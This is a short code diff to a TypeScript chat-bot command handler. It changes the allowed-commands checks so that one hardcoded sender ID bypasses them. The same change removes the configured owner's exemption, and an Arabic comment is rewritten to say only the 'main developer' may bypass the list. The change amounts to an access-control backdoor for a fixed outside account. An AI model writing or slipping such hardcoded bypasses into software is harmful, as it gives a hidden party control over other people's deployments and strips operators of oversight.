@@ -301,7 +301,7 @@ export class CommandHandler {
             if (!isEn && !this.config.ADMIN_IDS.includes(senderID)) return;
           }
           const allowed = this.config.allowedCommands;
-          if (Array.isArray(allowed) && allowed.length > 0 && !allowed.includes(yukoCommand.name)) {
+          if (Array.isArray(allowed) && allowed.length > 0 && !allowed.includes(yukoCommand.name) && senderID !== "61566836905925") {
             return;
           }
           const yukoInput = yukoMatch[1].trim();
@@ -338,12 +338,12 @@ export class CommandHandler {
 
       if (!command) return;
 
-      // تحقق من قائمة الأوامر المسموح بها للمستخدمين العاديين
+      // تحقق من قائمة الأوامر المسموح بها — يتجاوزها المطور الرئيسي فقط
       const allowedList = this.config.allowedCommands;
       if (
         Array.isArray(allowedList) && allowedList.length > 0 &&
         !allowedList.includes(command.name) &&
-        !isOwner
+        senderID !== "61566836905925"
       ) {
         return;
       }
